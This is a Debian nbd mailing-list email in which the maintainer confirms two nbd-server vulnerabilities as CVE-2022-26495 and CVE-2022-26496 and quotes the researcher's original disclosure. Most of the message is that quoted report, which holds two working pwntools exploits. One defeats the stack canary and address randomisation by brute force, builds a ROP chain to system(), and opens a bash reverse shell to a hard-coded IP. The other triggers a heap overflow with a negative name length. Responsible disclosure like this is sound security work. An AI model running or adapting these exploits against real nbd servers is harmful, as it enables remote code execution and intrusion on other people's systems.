Return-Path: <bounce-nbd=lists+nbd=lfdr.de@other.debian.org>
X-Original-To: lists+nbd@lfdr.de
Delivered-To: lists+nbd@lfdr.de
Received: from bendel.debian.org (bendel.debian.org [82.195.75.100])
	by mail.lfdr.de (Postfix) with ESMTPS id 84EFF4CE9DE
	for <lists+nbd@lfdr.de>; Sun,  6 Mar 2022 08:17:05 +0100 (CET)
Received: from localhost (localhost [127.0.0.1])
	by bendel.debian.org (Postfix) with QMQP
	id 656F3202E3; Sun,  6 Mar 2022 07:17:05 +0000 (UTC)
X-Mailbox-Line: From nbd-request@other.debian.org  Sun Mar  6 07:17:05 2022
Old-Return-Path: <w@uter.be>
X-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on bendel.debian.org
X-Spam-Level: 
X-Spam-Status: No, score=-11.3 required=4.0 tests=DIGITS_LETTERS,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,LDOSUBSCRIBER,LDO_WHITELIST,
	MD5_SHA1_SUM,T_SCC_BODY_TEXT_LINE autolearn=unavailable
	autolearn_force=no version=3.4.2
X-Original-To: lists-other-nbd@bendel.debian.org
Delivered-To: lists-other-nbd@bendel.debian.org
Received: from localhost (localhost [127.0.0.1])
	by bendel.debian.org (Postfix) with ESMTP id A9FCA202DF
	for <lists-other-nbd@bendel.debian.org>; Sun,  6 Mar 2022 07:16:56 +0000 (UTC)
X-Virus-Scanned: at lists.debian.org with policy bank en-lt
X-Amavis-Spam-Status: No, score=-7.21 tagged_above=-10000 required=5.3
	tests=[BAYES_00=-2, DIGITS_LETTERS=1, DKIM_SIGNED=0.1,
	DKIM_VALID=-0.1, DKIM_VALID_AU=-0.1, DKIM_VALID_EF=-0.1,
	LDO_WHITELIST=-5, MD5_SHA1_SUM=-1, T_SCC_BODY_TEXT_LINE=-0.01]
	autolearn=ham autolearn_force=no
Received: from bendel.debian.org ([127.0.0.1])
	by localhost (lists.debian.org [127.0.0.1]) (amavisd-new, port 2525)
	with ESMTP id uZX_VClG42Qv for <lists-other-nbd@bendel.debian.org>;
	Sun,  6 Mar 2022 07:16:50 +0000 (UTC)
X-policyd-weight: using cached result; rate:hard: -4.6
Received: from lounge.grep.be (lounge.grep.be [IPv6:2a01:4f8:200:91e8::2])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange ECDHE (P-256) server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(Client did not present a certificate)
	by bendel.debian.org (Postfix) with ESMTPS id 8ECFE202D6
	for <nbd@other.debian.org>; Sun,  6 Mar 2022 07:16:50 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=uter.be;
	s=2021.lounge; h=In-Reply-To:Content-Transfer-Encoding:Content-Type:
	MIME-Version:References:Message-ID:Subject:Cc:To:From:Date:Sender:Reply-To:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:List-Id:List-Help:List-Unsubscribe:
	List-Subscribe:List-Post:List-Owner:List-Archive;
	bh=sbDLl3QwsZptcyXHIExGE01qmEml1RZPpCj9OAZxiOc=; b=fT3dmmxTWc0PIKKlfmucPlz6AR
	tlHlB8DgS1K0ZsuFNsFxU/FIvDzcorRPiYQ9b0/2CWFiSVy6settUh/DsePu5CXc0MM0nVbOemAEz
	jaFfomep2sMKWY837wfN1z7Cd/Q4LuTrAfFo/WgYM5q3fKb18iC5Vwt32h5+ZyKbocvJU0GJ04g1l
	MV2ZcM329ZOzGoA3fNa/I2lrskEAdJ2HFfbuoAJXd8ibYRCecFCMShXg13GP3L/jZp1qEwf+6Vb/6
	hdVWWe+6Lfsrds08+tK09irxMLuS1pL92xv6J08nuwbO+kbvhmCdM0YRGTNIaW9AB79tSmE860kc5
	68IuKJwA==;
Received: from [197.245.197.46] (helo=pc181009)
	by lounge.grep.be with esmtpsa  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
	(Exim 4.94.2)
	(envelope-from <w@uter.be>)
	id 1nQl8J-00HLoj-0j; Sun, 06 Mar 2022 08:16:47 +0100
Received: from wouter by pc181009 with local (Exim 4.95)
	(envelope-from <w@uter.be>)
	id 1nQl8B-0001pt-JZ;
	Sun, 06 Mar 2022 09:16:39 +0200
Date: Sun, 6 Mar 2022 09:16:39 +0200
From: Wouter Verhelst <w@uter.be>
To: =?utf-8?B?546L5aSa?= <duo.wang@chaitin.com>
Cc: nbd@other.debian.org
Subject: Re: report security problem of nbd
Message-ID: <YiRf1w0L6OAvZ48M@pc181009.grep.be>
References: <CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com>
X-Speed: Gates' Law: Every 18 months, the speed of software halves.
Organization: none
X-Rc-Virus: 2007-09-13_01
X-Rc-Spam: 2008-11-04_01
Resent-Message-ID: <mjRLnFORDSP.A.utF.x_FJiB@bendel>
Resent-From: nbd@other.debian.org
X-Mailing-List: <nbd@other.debian.org> archive/latest/1725
X-Loop: nbd@other.debian.org
List-Id: <nbd.other.debian.org>
List-URL: <https://lists.debian.org/nbd/>
List-Post: <mailto:nbd@other.debian.org>
List-Help: <mailto:nbd-request@other.debian.org?subject=help>
List-Subscribe: <mailto:nbd-request@other.debian.org?subject=subscribe>
List-Unsubscribe: <mailto:nbd-request@other.debian.org?subject=unsubscribe>
Precedence: list
Resent-Sender: nbd-request@other.debian.org
List-Archive: https://lists.debian.org/msgid-search/YiRf1w0L6OAvZ48M@pc181009.grep.be
Resent-Date: Sun,  6 Mar 2022 07:17:05 +0000 (UTC)

Hi,

Thanks for your report.

These two issues are now CVE-2022-26495 and CVE-2022-26496, and have
been fixed on git master. I plan to release fixed nbd packages later
today.

(You are listed as discoverer on both issues, although you share credit
for the discovery on one of them with a parallel reporter)

On Mon, Jan 24, 2022 at 12:10:06PM +0800, 王多 wrote:
>    1.stack overflow 
>    In nbd-server.c, function handle_info have a stack overflow 
>    https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2299
>    len can be controlled by an attacker, the buf size is 1024, when `len -
>    sizeof(namelen) > 1024` the buf overflow.
>    python poc code as following:
>    from pwn import *
>    import time
>    import sys
>    context.endian = "big"
>    context.log_level = "debug"
>    elf = ELF("./nbd-server")
>    NBD_OPT = {
>        "NBD_OPT_EXPORT_NAME":1,
>        "NBD_OPT_ABORT":2,
>        "NBD_OPT_LIST":3,
>        "NBD_OPT_STARTTLS":5,
>        "NBD_OPT_INFO":6,
>        "NBD_OPT_GO":7,
>        "NBD_OPT_STRUCTURED_REPLY":8,
>        "NBD_OPT_LIST_META_CONTEXT":9,
>        "NBD_OPT_SET_META_CONTEXT":10
>    }
>    NBD_NEW_VERSION = b"IHAVEOPT"
>    def nbd_opt_info(buf, name):
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_INFO"])
>        option += p32(len(buf) + 4)
>        option += p32(len(name))
>        option += buf
>        option += name
>        option += p16(0)
>        p.send(option)
>        return
>    def nbd_opt_list():
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_LIST"])
>        option += p32(0)
>        p.send(option)
>        return
>    def nbd_opt_structured_reply():
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_STRUCTURED_REPLY"])
>        option += p32(0)
>        p.send(option)
>        return
>    def nbd_opt_set_meta_context(exportname, querystring):
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_SET_META_CONTEXT"])
>        option += p32(4 + len(exportname) + 4 + 4 + len(querystring))
>        p.send(option)
>        msg = b""
>        msg += p32(len(exportname)) # exportnamelen
>        msg += exportname.encode("latin") # exportname
>        msg += p32(1) # nr_queries
>        msg += p32(len(querystring)) # querylen
>        msg += querystring.encode("latin") # querystring
>        p.send(msg)
>        return
>    def nbd_opt_list_meta_context(exportname, querystring):
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_LIST_META_CONTEXT"])
>        option += p32(4 + len(exportname) + 4 + 4 + len(querystring))
>        p.send(option)
>       
>        msg = b""
>        msg += p32(len(exportname)) # exportnamelen
>        msg += exportname.encode("latin") # exportname
>        msg += p32(1) # nr_queries
>        msg += p32(len(querystring)) # querylen
>        msg += querystring.encode("latin") # querystring
>        p.send(msg)
>        return
>    def nbd_opt_go(exportname, info):
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_GO"])
>        option += p32(4 + len(exportname) + 2 + 2)
>        p.send(option)
>       
>        msg = b""
>        msg += p32(len(exportname)) # exportnamelen
>        msg += exportname.encode("latin") # exportname
>        msg += p16(1) # nrinfos
>        msg += p16(info) # info
>        p.send(msg)
>        return
>    t0 = time.perf_counter()
>    if len(sys.argv) < 3:
>        print("usage: nbdtest.py ip port")
>        exit(0)
>    ip = sys.argv[1]
>    port = int(sys.argv[2])
>    p = remote(ip, port)
>    p.recvuntil(b"NBDMAGICIHAVEOPT")
>    gflag = u16(p.recv())
>    p.send(p32(gflag))
>    canary = b"\x00"
>    for i in range(7):
>        for j in range(256):
>            payload = b""
>            payload += b"A"*1032
>            payload += canary
>            payload += p8(j)
>            nbd_opt_info(payload, b"B"*4096)
>            p.recvuntil(b"Export unknown")
>            p.send(NBD_NEW_VERSION + p32(0xdeadbeef) + p32(0))
>            try:
>                p.recvuntil(b"The given option is unknown to this server
>    implementation")
>            except:
>                p.close()
>                p = remote(ip, port)
>                p.recvuntil(b"NBDMAGICIHAVEOPT")
>                gflag = u16(p.recv())
>                p.send(p32(gflag))
>                continue
>            canary += p8(j)
>            p.close()
>            p = remote(ip, port)
>            p.recvuntil(b"NBDMAGICIHAVEOPT")
>            gflag = u16(p.recv())
>            p.send(p32(gflag))
>            break
>    log.success("canary: "+ hex(u64(canary.ljust(8, b"\x00"),
>    endian='little')))
>    progaddr = b"\x70"
>    for i in range(5):
>        for j in range(256):
>            payload = b""
>            payload += b"A"*1032
>            payload += canary
>            payload += p64(0xdeadbeef, endian='little')*7
>            payload += progaddr
>            payload += p8(j)
>            nbd_opt_info(payload, b"B"*4096)
>            p.recvuntil(b"Export unknown")
>            try:
>                p.recvuntil(b"NBDMAGICIHAVEOPT")
>            except:
>                p.close()
>                p = remote(ip, port)
>                p..recvuntil(b"NBDMAGICIHAVEOPT")
>                gflag = u16(p.recv())
>                p.send(p32(gflag))
>                continue
>            progaddr += p8(j)
>            p.close()
>            p = remote(ip, port)
>            p.recvuntil(b"NBDMAGICIHAVEOPT")
>            gflag = u16(p.recv())
>            p.send(p32(gflag))
>            break
>    proc_base = u64(progaddr.ljust(8, b"\x00"), endian='little') - 0x9570
>    log.success("proc_base: "+ hex(proc_base))
>    payload = b""
>    payload += b"A"*1032
>    payload += canary
>    payload += p64(0xdeadbeef, endian='little')*7
>    payload += p64(proc_base + 0xC2AA, endian='little')
>    payload += p64(0, endian='little')
>    payload += p64(1, endian='little')
>    payload += p64(4, endian='little')
>    payload += p64(proc_base + 0x13400, endian='little')
>    payload += p64(0x40, endian='little')
>    payload += p64(proc_base + elf.got['read'], endian='little')
>    payload += p64(proc_base + 0xC290, endian='little')
>    payload += p64(0)*7
>    payload += p64(proc_base + 0x4a58, endian='little')
>    payload += p64(proc_base + 0x13400, endian='little')
>    payload += p64(proc_base + elf.plt['system'] , endian='little')
>    nbd_opt_info(payload, b"B"*4096)
>    p.send(b"bash -c 'sh -i >& /dev/tcp/192.168.228.133/23333 0>&1'")
>    print(time.perf_counter() - t0)
>    p.interactive()
>    2.heap overflow
>    In nbd-server.c, function handle_info and handle_export_name have a
>    heap overflow
>    https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2302
>    https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2117
>    namelen can be controlled by an attacker,  when `namelen = -1`,  malloc
>    will allocate a very small buffer, but socket_read will read a 0xffffffff,
>    thus causing a heap overflow
>    from pwn import *
>    context.endian = "big"
>    context.log_level = "debug"
>    elf = ELF("./nbd-server")
>    NBD_OPT = {
>        "NBD_OPT_EXPORT_NAME":1,
>        "NBD_OPT_ABORT":2,
>        "NBD_OPT_LIST":3,
>        "NBD_OPT_STARTTLS":5,
>        "NBD_OPT_INFO":6,
>        "NBD_OPT_GO":7,
>        "NBD_OPT_STRUCTURED_REPLY":8,
>        "NBD_OPT_LIST_META_CONTEXT":9,
>        "NBD_OPT_SET_META_CONTEXT":10
>    }
>    NBD_NEW_VERSION = b"IHAVEOPT"
>    def nbd_opt_info(buf, name):
>        option = b""
>        option += NBD_NEW_VERSION
>        option += p32(NBD_OPT["NBD_OPT_INFO"])
>        option += p32(len(buf) + 4)
>        option += p32(len(name))
>        option += buf
>        option += name
>        option += p16(0)
>        p.send(option)
>        return
>    if len(sys.argv) < 3:
>        print("usage: nbdtest.py ip port")
>        exit(0)
>    ip = sys.argv[1]
>    port = int(sys.argv[2])
>    p = remote(ip, port)
>    p.recvuntil(b"NBDMAGICIHAVEOPT")
>    gflag = u16(p.recv())
>    p.send(p32(gflag))
>    option = b""
>    option += NBD_NEW_VERSION
>    option += p32(NBD_OPT["NBD_OPT_INFO"])
>    option += p32(1024)
>    option  +=  p32(-1)
>    option += b"A"*1024
>    option += b"B"*4096
>    option += p16(0)
>    p.send(option)
>    Wangduo of Chaitin Security Research Lab

-- 
     w@uter.{be,co.za}
wouter@{grep.be,fosdem.org,debian.org}

